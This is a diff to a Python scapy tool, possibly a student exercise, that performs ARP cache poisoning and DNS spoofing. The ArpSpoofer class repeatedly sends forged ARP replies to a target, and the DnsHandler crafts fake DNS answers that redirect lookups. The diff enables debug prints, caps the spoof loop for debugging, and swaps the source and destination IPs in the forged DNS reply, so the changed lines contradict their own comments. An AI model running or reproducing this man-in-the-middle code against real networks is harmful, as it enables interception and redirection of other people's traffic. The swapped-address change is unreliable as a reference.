@@ -52,7 +52,7 @@ class ArpSpoofer(object):
         if self.target_mac is None:
             # send ARP request to target_ip
             # ARP_request = ARP(pdst=self.target_ip)
-            # print("waiting for arp response for target MAC")
+            print("waiting for arp response for target MAC")
             # response = sr1(ARP_request, iface=IFACE)
             # self.target_mac = response.hwsrc
             self.target_mac = getmacbyip(self.target_ip)
@@ -69,14 +69,15 @@ class ArpSpoofer(object):
 
         arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
         scapy.send(arp_response, iface=IFACE, verbose=0)
-        # print(f"Sending spoof number {self.spoof_count}")
-        # self.spoof_count += 1
+        print(f"Sending spoof number {self.spoof_count}")
+        self.spoof_count += 1
 
     def run(self) -> None:
         """
         Main loop of the process.
         """
-        while True:
+        while self.spoof_count < 100: # todo remove this after debugging
+        # while True:
             self.spoof()
             time.sleep(SPOOF_SLEEP_TIME)
 
@@ -168,8 +169,8 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
-        ip_src = pkt[IP].dst  # Original destination IP
-        ip_dst = pkt[IP].src  # Original source IP
+        ip_src = pkt[IP].src  # Original destination IP
+        ip_dst = pkt[IP].dst  # Original source IP
         port_src = pkt[UDP].dport  # Original destination port
         port_dst = pkt[UDP].sport  # Original source port
         transaction_id = pkt[DNS].id  # Transaction ID
